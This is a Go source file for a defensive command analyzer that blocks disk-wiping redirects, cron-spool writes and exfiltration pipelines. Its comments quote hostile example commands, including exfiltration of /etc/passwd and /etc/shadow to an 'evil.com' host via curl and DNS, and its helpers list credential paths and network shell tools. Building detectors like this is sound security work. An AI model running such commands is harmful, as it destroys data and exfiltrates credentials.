package analyzer

import (
	"strings"
)

// DataflowAnalyzer (Layer 3) tracks data movement from source to sink through
// pipes, redirects, and command substitutions. It detects exfiltration chains
// (sensitive file → encoding → network) and destructive redirects
// (zero source → device sink).
//
// Depends on ctx.Parsed from the structural analyzer (Layer 1).
type DataflowAnalyzer struct {
	userRules []DataflowRule // user-defined YAML dataflow rules
}

// NewDataflowAnalyzer creates a dataflow analyzer.
func NewDataflowAnalyzer() *DataflowAnalyzer {
	return &DataflowAnalyzer{}
}

// SetUserRules attaches user-defined dataflow rules from YAML packs.
func (d *DataflowAnalyzer) SetUserRules(rules []DataflowRule) {
	d.userRules = rules
}

func (d *DataflowAnalyzer) Name() string { return "dataflow" }

// Analyze inspects the parsed command for dangerous source→sink flows.
// It enriches ctx.DataFlows for downstream consumers.
func (d *DataflowAnalyzer) Analyze(ctx *AnalysisContext) []Finding {
	if ctx.Parsed == nil {
		return nil
	}

	var findings []Finding

	// 1. Run built-in Go checks
	// Check redirect-based flows (e.g., cat /dev/zero > /dev/sda)
	findings = append(findings, d.checkRedirectFlows(ctx)...)

	// Check pipe-based flows (e.g., cat /etc/passwd | base64 | curl)
	findings = append(findings, d.checkPipeFlows(ctx)...)

	// Check command substitution exfiltration (e.g., dig $(cat /etc/passwd).evil.com)
	findings = append(findings, d.checkSubstitutionExfil(ctx)...)

	// 2. Run user-defined YAML dataflow rules
	for _, rule := range d.userRules {
		if MatchDataflowRule(ctx.Parsed, rule) {
			f := Finding{
				AnalyzerName: "dataflow",
				RuleID:       rule.ID,
				Decision:     rule.Decision,
				Confidence:   rule.Confidence,
				Reason:       rule.Reason,
				TaxonomyRef:  rule.Taxonomy,
			}
			if f.Confidence == 0 {
				f.Confidence = 0.85
			}
			findings = append(findings, f)
		}
	}

	return findings
}

// checkRedirectFlows detects dangerous redirect patterns:
//   - Zero/urandom source redirected to device file (disk destruction)
//   - Sensitive file redirected to network command output
func (d *DataflowAnalyzer) checkRedirectFlows(ctx *AnalysisContext) []Finding {
	var findings []Finding
	parsed := ctx.Parsed

	// Collect ALL redirects: top-level + per-segment
	type redirectWithContext struct {
		redir   Redirect
		segIdx  int
		segment *CommandSegment
	}
	var allRedirects []redirectWithContext

	// Top-level redirects (apply to the overall command)
	for _, r := range parsed.Redirects {
		seg := (*CommandSegment)(nil)
		if len(parsed.Segments) > 0 {
			seg = &parsed.Segments[0]
		}
		allRedirects = append(allRedirects, redirectWithContext{redir: r, segIdx: 0, segment: seg})
	}
	// Per-segment redirects
	for i := range parsed.Segments {
		for _, r := range parsed.Segments[i].Redirects {
			allRedirects = append(allRedirects, redirectWithContext{redir: r, segIdx: i, segment: &parsed.Segments[i]})
		}
	}

	for _, rc := range allRedirects {
		redir := rc.redir

		// Classify source (if segment available)
		source := ""
		if rc.segment != nil {
			source = classifySource(rc.segment.Executable, rc.segment.Args)
		}
		sink := classifySink(redir.Path)

		// Zero source → device sink = disk destruction
		if source == "zero-source" && sink == "device-sink" {
			flow := DataFlow{
				Source:    sourceLabel(rc.segment.Executable, rc.segment.Args),
				Sink:      redir.Path,
				Transform: "redirect(" + redir.Op + ")",
				Risk:      "critical",
			}
			ctx.DataFlows = append(ctx.DataFlows, flow)

			findings = append(findings, Finding{
				AnalyzerName: "dataflow",
				RuleID:       "df-block-zero-to-device",
				Decision:     "BLOCK",
				Confidence:   0.95,
				Reason:       "Data flow from zero/random source redirected to device file: " + redir.Path,
				TaxonomyRef:  "destructive-ops/disk-ops/disk-overwrite",
				Tags:         []string{"dataflow", "disk-destruction"},
			})
		}

		// Sensitive source → device sink = data destruction
		if source == "sensitive-source" && sink == "device-sink" {
			flow := DataFlow{
				Source:    sourceLabel(rc.segment.Executable, rc.segment.Args),
				Sink:      redir.Path,
				Transform: "redirect(" + redir.Op + ")",
				Risk:      "critical",
			}
			ctx.DataFlows = append(ctx.DataFlows, flow)

			findings = append(findings, Finding{
				AnalyzerName: "dataflow",
				RuleID:       "df-block-sensitive-to-device",
				Decision:     "BLOCK",
				Confidence:   0.90,
				Reason:       "Redirect of sensitive data to device file: " + redir.Path,
				TaxonomyRef:  "destructive-ops/disk-ops/disk-overwrite",
				Tags:         []string{"dataflow", "disk-destruction"},
			})
		}

		// ANY write to cron spool = persistence (source doesn't matter)
		if isCronSpoolPath(redir.Path) && (redir.Op == ">>" || redir.Op == ">") {
			flow := DataFlow{
				Source:    "command-output",
				Sink:      redir.Path,
				Transform: "redirect(" + redir.Op + ")",
				Risk:      "critical",
			}
			if rc.segment != nil {
				flow.Source = rc.segment.Executable
			}
			ctx.DataFlows = append(ctx.DataFlows, flow)

			findings = append(findings, Finding{
				AnalyzerName: "dataflow",
				RuleID:       "df-block-write-cron-spool",
				Decision:     "BLOCK",
				Confidence:   0.90,
				Reason:       "Direct write to cron spool file: " + redir.Path,
				TaxonomyRef:  "persistence-evasion/scheduled-tasks/crontab-modification",
				Tags:         []string{"dataflow", "persistence"},
			})
		}
	}

	return findings
}

// checkPipeFlows detects dangerous pipe chains:
//   - Sensitive file → encoding → network command (exfiltration)
//   - Credential source → any network sink
func (d *DataflowAnalyzer) checkPipeFlows(ctx *AnalysisContext) []Finding {
	var findings []Finding
	parsed := ctx.Parsed

	if len(parsed.Segments) < 2 {
		return nil
	}

	// Track data sensitivity through the pipe chain
	hasSensitiveSource := false
	hasEncoding := false

	for i, seg := range parsed.Segments {
		source := classifySource(seg.Executable, seg.Args)
		if source == "sensitive-source" || source == "credential-source" {
			hasSensitiveSource = true
		}

		if isEncodingCommand(seg.Executable) {
			hasEncoding = true
		}

		// Check if this segment is a network sink
		if isNetworkCommand(seg.Executable) && hasSensitiveSource {
			flow := DataFlow{
				Source:    sourceLabel(parsed.Segments[0].Executable, parsed.Segments[0].Args),
				Sink:      seg.Executable,
				Transform: "pipe",
				Risk:      "critical",
			}
			if hasEncoding {
				flow.Transform = "pipe+encoding"
			}
			ctx.DataFlows = append(ctx.DataFlows, flow)

			findings = append(findings, Finding{
				AnalyzerName: "dataflow",
				RuleID:       "df-block-sensitive-to-network",
				Decision:     "BLOCK",
				Confidence:   0.90,
				Reason: "Sensitive data piped to network command: " +
					parsed.Segments[0].Executable + " → " + seg.Executable,
				TaxonomyRef: "data-exfiltration/network-egress/reverse-shell",
				Tags:        []string{"dataflow", "exfiltration"},
			})
		}

		// Check: pipe of sensitive data to a dangerous consumer
		if i > 0 && hasSensitiveSource && isDataflowDangerousSink(seg.Executable) {
			flow := DataFlow{
				Source:    sourceLabel(parsed.Segments[0].Executable, parsed.Segments[0].Args),
				Sink:      seg.Executable,
				Transform: "pipe",
				Risk:      "high",
			}
			ctx.DataFlows = append(ctx.DataFlows, flow)
		}
	}

	return findings
}

// checkSubstitutionExfil detects command substitution used for exfiltration:
//   - dig AAAA $(cat /etc/passwd | base64).evil.com
//   - curl http://evil.com/$(cat /etc/shadow)
func (d *DataflowAnalyzer) checkSubstitutionExfil(ctx *AnalysisContext) []Finding {
	var findings []Finding
	raw := ctx.RawCommand

	// Look for patterns like $(cat /etc/...) or $(base64 ...) inside DNS/curl commands
	if !strings.Contains(raw, "$(") && !strings.Contains(raw, "`") {
		return nil
	}

	// Check if outer command is a network tool
	for _, seg := range ctx.Parsed.Segments {
		if !isNetworkCommand(seg.Executable) && !isDNSCommand(seg.Executable) {
			continue
		}

		// Check if any subcommand reads sensitive data
		for _, sub := range ctx.Parsed.Subcommands {
			for _, subSeg := range sub.Segments {
				source := classifySource(subSeg.Executable, subSeg.Args)
				if source == "sensitive-source" || source == "credential-source" {
					flow := DataFlow{
						Source:    sourceLabel(subSeg.Executable, subSeg.Args),
						Sink:      seg.Executable,
						Transform: "command-substitution",
						Risk:      "critical",
					}
					ctx.DataFlows = append(ctx.DataFlows, flow)

					findings = append(findings, Finding{
						AnalyzerName: "dataflow",
						RuleID:       "df-block-substitution-exfil",
						Decision:     "BLOCK",
						Confidence:   0.85,
						Reason: "Sensitive data exfiltrated via command substitution into " +
							seg.Executable + " command",
						TaxonomyRef: "data-exfiltration/network-egress/dns-tunneling",
						Tags:        []string{"dataflow", "exfiltration", "encoding"},
					})
				}
			}
		}

		// Fallback: raw string check for common exfil patterns in substitution
		if hasSensitiveSubstitution(raw) {
			// Upgrade to BLOCK if the outer command is DNS (strong exfil signal)
			decision := "AUDIT"
			confidence := 0.70
			if isDNSCommand(seg.Executable) {
				decision = "BLOCK"
				confidence = 0.85
			}
			findings = append(findings, Finding{
				AnalyzerName: "dataflow",
				RuleID:       "df-block-substitution-exfil",
				Decision:     decision,
				Confidence:   confidence,
				Reason:       "Sensitive data exfiltrated via command substitution into " + seg.Executable,
				TaxonomyRef:  "data-exfiltration/network-egress/dns-tunneling",
				Tags:         []string{"dataflow", "exfiltration", "encoding"},
			})
		}
	}

	return findings
}

// ---------------------------------------------------------------------------
// Classification helpers
// ---------------------------------------------------------------------------

// classifySource returns a source category based on what data the command reads.
func classifySource(executable string, args []string) string {
	// Commands that read from stdin/files
	switch executable {
	case "cat", "head", "tail", "less", "more", "tac", "nl":
		for _, a := range args {
			if isZeroSource(a) {
				return "zero-source"
			}
			if isSensitivePath(a) {
				return "sensitive-source"
			}
			if isCredentialPath(a) {
				return "credential-source"
			}
		}
	case "dd":
		for _, a := range args {
			if strings.HasPrefix(a, "if=") {
				path := strings.TrimPrefix(a, "if=")
				if isZeroSource(path) {
					return "zero-source"
				}
				if isSensitivePath(path) {
					return "sensitive-source"
				}
			}
		}
	}
	return ""
}

func sourceLabel(executable string, args []string) string {
	for _, a := range args {
		if isZeroSource(a) || isSensitivePath(a) || isCredentialPath(a) {
			return a
		}
		if strings.HasPrefix(a, "if=") {
			return strings.TrimPrefix(a, "if=")
		}
	}
	return executable
}

// classifySink returns a sink category based on the redirect/pipe target.
func classifySink(path string) string {
	if isDevicePath(path) {
		return "device-sink"
	}
	if isCronSpoolPath(path) {
		return "cron-sink"
	}
	return ""
}

func isZeroSource(path string) bool {
	return path == "/dev/zero" || path == "/dev/urandom" || path == "/dev/random"
}

func isSensitivePath(path string) bool {
	sensitive := []string{
		"/etc/passwd", "/etc/shadow", "/etc/hosts",
		"/etc/sudoers", "/proc/", "/sys/",
	}
	for _, s := range sensitive {
		if strings.HasPrefix(path, s) || path == s {
			return true
		}
	}
	return false
}

func isCredentialPath(path string) bool {
	cred := []string{
		".ssh/", ".aws/", ".gnupg/", ".kube/",
		".npmrc", ".pypirc", ".netrc",
	}
	for _, c := range cred {
		if strings.Contains(path, c) {
			return true
		}
	}
	return false
}

func isDevicePath(path string) bool {
	// Block device paths (disks)
	devices := []string{"/dev/sd", "/dev/hd", "/dev/nvme", "/dev/vd", "/dev/xvd", "/dev/md", "/dev/dm-"}
	for _, d := range devices {
		if strings.HasPrefix(path, d) {
			return true
		}
	}
	return false
}

func isCronSpoolPath(path string) bool {
	return strings.Contains(path, "/cron") ||
		strings.Contains(path, "/spool/cron") ||
		strings.Contains(path, "/crontabs/")
}

func isNetworkCommand(cmd string) bool {
	net := []string{"curl", "wget", "nc", "ncat", "socat", "telnet", "ssh", "scp", "rsync", "ftp", "sftp"}
	for _, n := range net {
		if cmd == n {
			return true
		}
	}
	return false
}

func isDNSCommand(cmd string) bool {
	return cmd == "dig" || cmd == "nslookup" || cmd == "host"
}

func isEncodingCommand(cmd string) bool {
	enc := []string{"base64", "base32", "xxd", "od", "hexdump", "gzip", "bzip2", "xz"}
	for _, e := range enc {
		if cmd == e {
			return true
		}
	}
	return false
}

func isDataflowDangerousSink(cmd string) bool {
	return isNetworkCommand(cmd) || isDNSCommand(cmd) ||
		cmd == "bash" || cmd == "sh" || cmd == "crontab"
}

// hasSensitiveSubstitution checks raw command for $(cat /etc/...) patterns.
func hasSensitiveSubstitution(raw string) bool {
	sensitivePaths := []string{"/etc/passwd", "/etc/shadow", ".ssh/", ".aws/"}
	for _, s := range sensitivePaths {
		if strings.Contains(raw, s) && (strings.Contains(raw, "$(") || strings.Contains(raw, "`")) {
			return true
		}
	}
	return false
}
